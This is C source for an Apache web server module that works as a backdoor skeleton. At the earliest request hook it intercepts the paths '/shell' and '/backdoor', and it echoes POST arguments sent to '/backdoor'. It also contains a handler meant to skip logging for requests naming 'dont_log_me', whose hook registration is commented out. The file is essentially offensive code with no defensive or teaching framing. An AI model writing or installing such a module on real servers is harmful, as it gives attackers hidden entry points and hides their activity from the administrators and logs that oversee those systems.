#include "httpd.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_request.h"

static void register_hooks(apr_pool_t *pool);
static int winchester_handler(request_rec *r);
static int backblast_handler(request_rec *r);

// very early handler
static int winchester_handler(request_rec *r)
{
	if (!r->unparsed_uri){
        // no uri, pass
        return OK;
    }
    if (strcmp(r->unparsed_uri, "/shell") == 0){
        ap_rprintf(r, "Shell dir");
        return DONE;
    }
    if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST){
        ap_rprintf(r, "Backdoor POST");
        ap_rprintf(r, "%s", r->args);
        return DONE;
    }

    // didn't hit a backdoor dir, pass
	return OK;
}

// logging handler
static int backblast_handler(request_rec *r)
{
    if (strcmp(r->filename, "dont_log_me")){
        // if this filename does not appear, move along
        return OK;
    }

    // if it does, throw DONE without logging
    return DONE;
}

static void register_hooks(apr_pool_t *pool)
{
   ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
   // ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
}

module AP_MODULE_DECLARE_DATA   winchester_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    register_hooks
};
